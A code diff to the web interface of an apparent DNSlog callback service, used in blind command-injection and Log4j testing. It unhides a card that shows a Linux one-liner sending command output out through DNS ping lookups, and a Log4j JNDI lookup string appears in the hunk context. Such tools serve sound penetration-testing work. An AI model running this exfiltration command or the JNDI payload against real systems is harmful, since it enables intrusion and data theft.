@@ -69,14 +69,14 @@
         </div>
         <!-- Shell command response card  -->
 
-        <div class="container-fluid p-t-15" v-if="iscmdresponse">
+        <div class="container-fluid p-t-15">
             <div class="card card-hover-shadow">
                 <header class="card-header">
                     <div class="card-title">dns 命令执行回显</div>
                 </header>
                 <div class="card-body">
                     <div class="callout callout-info">Linux:  
-                        <code>CMD="ifconfig";RExSP="$(eval "$CMD"|hexdump -v -e '/1 "%02X"')";R=$(tr -dc 'a-z0-9' &lt;/dev/urandom | head -c 4 | sed 's/^[\n\r]*//g');i=0;for s in $(echo $RExSP|fold -w 63);do i=$((i+1));ping -c 1 "$s.$i.$R.cmd.{{domain}}"&gt;/dev/null;done
+                        <code>CMD="这里填你的命令";RExSP="$(eval "$CMD"|hexdump -v -e '/1 "%02X"')";R=$(tr -dc 'a-z0-9' &lt;/dev/urandom | head -c 4 | sed 's/^[\n\r]*//g');i=0;for s in $(echo $RExSP|fold -w 63);do i=$((i+1));ping -c 1 "$s.$i.$R.cmd.{{domain}}"&gt;/dev/null;done
                         </code>
                     </div>
                     <br>
@@ -142,7 +142,6 @@ ${jndi:jndi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/hello}
             data() {
                 return {
                     isdomainexpire: false,
-                    iscmdresponse: false,
                     domain: "loading",
                     key: "loading...",
                     records: [],
@@ -171,8 +170,6 @@ ${jndi:jndi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/hello}
                         //举个例子： 1231231223123123.1.h1sw.cmd.de21.log.d48e48337471993e.com 
                         domainKeyArray = this.records[i].subdomain.split('.')
                         if (domainKeyArray[3]="cmd" && domainKeyArray.length==9) {
-                            this.iscmdresponse = true
-
                             randkey=domainKeyArray[2];  //example => h1sw
                             cmd_index=parseInt(domainKeyArray[1]); //example => 1
 
@@ -185,6 +182,7 @@ ${jndi:jndi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/hello}
                     for (i in randomKeys) {
                         _cmdrecords.push({time:randomKeys[i][0],content:this.hex2string(randomKeys[i].slice(1).join(""))})
                     }
+                    _cmdrecords=_cmdrecords.sort(function(a,b){return new Date(a.time)-new Date(b.time)})
 
                     this.cmdrecords = _cmdrecords
                 },
